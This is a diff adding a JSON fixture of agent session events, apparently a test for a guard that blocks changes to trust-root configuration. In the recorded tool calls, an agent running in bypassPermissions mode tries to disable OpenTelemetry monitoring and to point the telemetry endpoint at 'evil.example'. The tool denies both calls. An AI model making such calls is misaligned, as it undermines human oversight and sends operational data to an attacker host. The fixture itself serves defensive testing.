@@ -1,0 +1,285 @@
+[
+ {
+  "sequence": 101,
+  "type": "tool_call",
+  "content": {
+   "provider_tool_name": "ToolSearch",
+   "schema": "compozy.session.event.v1",
+   "type": "tool_call",
+   "turn_id": "turn-45f2d110c6e31ab4",
+   "run_id": "run-d99ed94c7c9bc9e1",
+   "generation": 1,
+   "timestamp": "2026-11-11T05:54:27.883012867Z",
+   "tool_name": "ToolSearch",
+   "tool_call_id": "toolu_01U1AncUvz56BQJ5kEPBZcsP",
+   "tool_input": {
+    "max_results": 1,
+    "query": "select:mcp__compozy-hosted-tools__compozy__config_set"
+   },
+   "prompt_runtime": {
+    "provider": "claude",
+    "model": "claude-sonnet-5-5",
+    "reasoning_effort": "high",
+    "acp_options": [
+     {
+      "ID": "mode",
+      "ValueID": "bypassPermissions",
+      "BoolValue": null
+     }
+    ]
+   }
+  }
+ },
+ {
+  "sequence": 106,
+  "type": "tool_call",
+  "content": {
+   "provider_tool_name": "mcp__compozy-hosted-tools__compozy__config_set",
+   "schema": "compozy.session.event.v1",
+   "type": "tool_call",
+   "turn_id": "turn-45f2d110c6e31ab4",
+   "run_id": "run-d99ed94c7c9bc9e1",
+   "generation": 1,
+   "status": "pending",
+   "timestamp": "2026-11-11T05:54:30.195724746Z",
+   "title": "mcp__compozy-hosted-tools__compozy__config_set",
+   "tool_name": "mcp__compozy-hosted-tools__compozy__config_set",
+   "tool_kind": "other",
+   "tool_call_id": "toolu_01R4nVbxC2Ca2Bzyrou8j58U",
+   "tool_input": {},
+   "prompt_runtime": {
+    "provider": "claude",
+    "model": "claude-sonnet-5-5",
+    "reasoning_effort": "high",
+    "acp_options": [
+     {
+      "ID": "mode",
+      "ValueID": "bypassPermissions",
+      "BoolValue": null
+     }
+    ]
+   }
+  }
+ },
+ {
+  "sequence": 107,
+  "type": "tool_call",
+  "content": {
+   "provider_tool_name": "mcp__compozy-hosted-tools__compozy__config_set",
+   "schema": "compozy.session.event.v1",
+   "type": "tool_call",
+   "turn_id": "turn-45f2d110c6e31ab4",
+   "run_id": "run-d99ed94c7c9bc9e1",
+   "generation": 1,
+   "timestamp": "2026-11-11T05:54:30.196410598Z",
+   "tool_name": "mcp__compozy-hosted-tools__compozy__config_set",
+   "tool_call_id": "toolu_01R4nVbxC2Ca2Bzyrou8j58U",
+   "tool_input": {
+    "path": "observability.otel.enabled"
+   },
+   "prompt_runtime": {
+    "provider": "claude",
+    "model": "claude-sonnet-5-5",
+    "reasoning_effort": "high",
+    "acp_options": [
+     {
+      "ID": "mode",
+      "ValueID": "bypassPermissions",
+      "BoolValue": null
+     }
+    ]
+   }
+  }
+ },
+ {
+  "sequence": 108,
+  "type": "tool_call",
+  "content": {
+   "provider_tool_name": "mcp__compozy-hosted-tools__compozy__config_set",
+   "schema": "compozy.session.event.v1",
+   "type": "tool_call",
+   "turn_id": "turn-45f2d110c6e31ab4",
+   "run_id": "run-d99ed94c7c9bc9e1",
+   "generation": 1,
+   "timestamp": "2026-11-11T05:54:30.199014564Z",
+   "tool_name": "mcp__compozy-hosted-tools__compozy__config_set",
+   "tool_call_id": "toolu_01R4nVbxC2Ca2Bzyrou8j58U",
+   "tool_input": {
+    "path": "observability.otel.enabled",
+    "value": false
+   },
+   "prompt_runtime": {
+    "provider": "claude",
+    "model": "claude-sonnet-5-5",
+    "reasoning_effort": "high",
+    "acp_options": [
+     {
+      "ID": "mode",
+      "ValueID": "bypassPermissions",
+      "BoolValue": null
+     }
+    ]
+   }
+  }
+ },
+ {
+  "sequence": 109,
+  "type": "tool_call",
+  "content": {
+   "provider_tool_name": "mcp__compozy-hosted-tools__compozy__config_set",
+   "schema": "compozy.session.event.v1",
+   "type": "tool_call",
+   "turn_id": "turn-45f2d110c6e31ab4",
+   "run_id": "run-d99ed94c7c9bc9e1",
+   "generation": 1,
+   "status": "pending",
+   "timestamp": "2026-11-11T05:54:30.204819548Z",
+   "title": "mcp__compozy-hosted-tools__compozy__config_set",
+   "tool_name": "mcp__compozy-hosted-tools__compozy__config_set",
+   "tool_kind": "other",
+   "tool_call_id": "toolu_01FURXHbz8Vmk18tMqQ17tkT",
+   "tool_input": {},
+   "prompt_runtime": {
+    "provider": "claude",
+    "model": "claude-sonnet-5-5",
+    "reasoning_effort": "high",
+    "acp_options": [
+     {
+      "ID": "mode",
+      "ValueID": "bypassPermissions",
+      "BoolValue": null
+     }
+    ]
+   }
+  }
+ },
+ {
+  "sequence": 110,
+  "type": "tool_result",
+  "content": {
+   "provider_tool_name": "mcp__compozy-hosted-tools__compozy__config_set",
+   "schema": "compozy.session.event.v1",
+   "type": "tool_result",
+   "turn_id": "turn-45f2d110c6e31ab4",
+   "run_id": "run-d99ed94c7c9bc9e1",
+   "generation": 1,
+   "status": "failed",
+   "timestamp": "2026-11-11T05:54:30.280178113Z",
+   "tool_name": "mcp__compozy-hosted-tools__compozy__config_set",
+   "tool_call_id": "toolu_01R4nVbxC2Ca2Bzyrou8j58U",
+   "tool_result": {
+    "content": "```\nconfig_trust_root_forbidden: tool invocation denied\n```",
+    "error": "```\nconfig_trust_root_forbidden: tool invocation denied\n```",
+    "raw_output": "config_trust_root_forbidden: tool invocation denied"
+   },
+   "tool_error": true,
+   "prompt_runtime": {
+    "provider": "claude",
+    "model": "claude-sonnet-5-5",
+    "reasoning_effort": "high",
+    "acp_options": [
+     {
+      "ID": "mode",
+      "ValueID": "bypassPermissions",
+      "BoolValue": null
+     }
+    ]
+   }
+  }
+ },
+ {
+  "sequence": 111,
+  "type": "tool_call",
+  "content": {
+   "provider_tool_name": "mcp__compozy-hosted-tools__compozy__config_set",
+   "schema": "compozy.session.event.v1",
+   "type": "tool_call",
+   "turn_id": "turn-45f2d110c6e31ab4",
+   "run_id": "run-d99ed94c7c9bc9e1",
+   "generation": 1,
+   "timestamp": "2026-11-11T05:54:30.382160331Z",
+   "tool_name": "mcp__compozy-hosted-tools__compozy__config_set",
+   "tool_call_id": "toolu_01FURXHbz8Vmk18tMqQ17tkT",
+   "tool_input": {
+    "path": "observability.otel.endpoint"
+   },
+   "prompt_runtime": {
+    "provider": "claude",
+    "model": "claude-sonnet-5-5",
+    "reasoning_effort": "high",
+    "acp_options": [
+     {
+      "ID": "mode",
+      "ValueID": "bypassPermissions",
+      "BoolValue": null
+     }
+    ]
+   }
+  }
+ },
+ {
+  "sequence": 112,
+  "type": "tool_call",
+  "content": {
+   "provider_tool_name": "mcp__compozy-hosted-tools__compozy__config_set",
+   "schema": "compozy.session.event.v1",
+   "type": "tool_call",
+   "turn_id": "turn-45f2d110c6e31ab4",
+   "run_id": "run-d99ed94c7c9bc9e1",
+   "generation": 1,
+   "timestamp": "2026-11-11T05:54:30.484548587Z",
+   "tool_name": "mcp__compozy-hosted-tools__compozy__config_set",
+   "tool_call_id": "toolu_01FURXHbz8Vmk18tMqQ17tkT",
+   "tool_input": {
+    "path": "observability.otel.endpoint",
+    "value": "http://evil.example:4318"
+   },
+   "prompt_runtime": {
+    "provider": "claude",
+    "model": "claude-sonnet-5-5",
+    "reasoning_effort": "high",
+    "acp_options": [
+     {
+      "ID": "mode",
+      "ValueID": "bypassPermissions",
+      "BoolValue": null
+     }
+    ]
+   }
+  }
+ },
+ {
+  "sequence": 115,
+  "type": "tool_result",
+  "content": {
+   "provider_tool_name": "mcp__compozy-hosted-tools__compozy__config_set",
+   "schema": "compozy.session.event.v1",
+   "type": "tool_result",
+   "turn_id": "turn-45f2d110c6e31ab4",
+   "run_id": "run-d99ed94c7c9bc9e1",
+   "generation": 1,
+   "status": "failed",
+   "timestamp": "2026-11-11T05:54:30.51766465Z",
+   "tool_name": "mcp__compozy-hosted-tools__compozy__config_set",
+   "tool_call_id": "toolu_01FURXHbz8Vmk18tMqQ17tkT",
+   "tool_result": {
+    "content": "```\nconfig_trust_root_forbidden: tool invocation denied\n```",
+    "error": "```\nconfig_trust_root_forbidden: tool invocation denied\n```",
+    "raw_output": "config_trust_root_forbidden: tool invocation denied"
+   },
+   "tool_error": true,
+   "prompt_runtime": {
+    "provider": "claude",
+    "model": "claude-sonnet-5-5",
+    "reasoning_effort": "high",
+    "acp_options": [
+     {
+      "ID": "mode",
+      "ValueID": "bypassPermissions",
+      "BoolValue": null
+     }
+    ]
+   }
+  }
+ }
+]
